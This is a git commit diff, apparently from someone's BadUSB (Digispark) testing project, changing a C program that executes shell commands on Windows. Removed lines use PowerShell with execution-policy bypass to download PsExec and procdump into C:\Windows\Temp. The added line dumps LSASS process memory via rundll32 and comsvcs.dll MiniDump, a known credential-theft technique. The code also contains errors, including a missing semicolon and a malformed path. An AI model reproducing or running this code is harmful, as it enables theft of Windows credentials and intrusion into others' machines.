ba96bbf5ad07670c1fe6b117f776c0be22f7b981
jacobh4535 <jacob.holtz20@gmail.com>
2021-12-21 10:43:50 -0600

    testing

--- digispark_exe.c
+++ digispark_exe.c
@@ -3,15 +3,9 @@
 #include <string.h>
 
 int main(int c, char *argv[]){
-	char path = "C:\\Windows\\Temp";
-
-	printf("exe executed, downloading pe.exe\n");
-	system("powershell -exec bypass -C \"& { ((New-Object System.Net.WebClient).DownloadFile('http://live.sysinternals.com/PsExec64.exe','C:\\Windows\\Temp\\pe.exe')) } \"");
-	printf("ps.exe downloaded, downloading pd.exe\n");
-	system("powershell -exec bypass -C \"& { ((New-Object System.Net.WebClient).DownloadFile('http://live.sysinternals.com/procdump64.exe','C:\\Windows\\Temp\\pd.exe')) } \"");
-	printf("pd.exe downloaded. listing files");
-	system("ls C:\\Windows\\Temp\\pe.exe");
-	system("ls C:\\Windows\\Temp\\pd.exe");
+	printf("exe executed, dumping lsass.dmp to desktop\n");
+	//system("powershell -exec bypass -C \"& { ((New-Object System.Net.WebClient).DownloadFile('http://live.sysinternals.com/PsExec64.exe','C:\\Windows\\Temp\\pe.exe')) } \"");
+	system("C:\\Windows\\system32\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Users\\Jacob\\Desktop\\lsass.dmp full")
 
 
 	getchar();
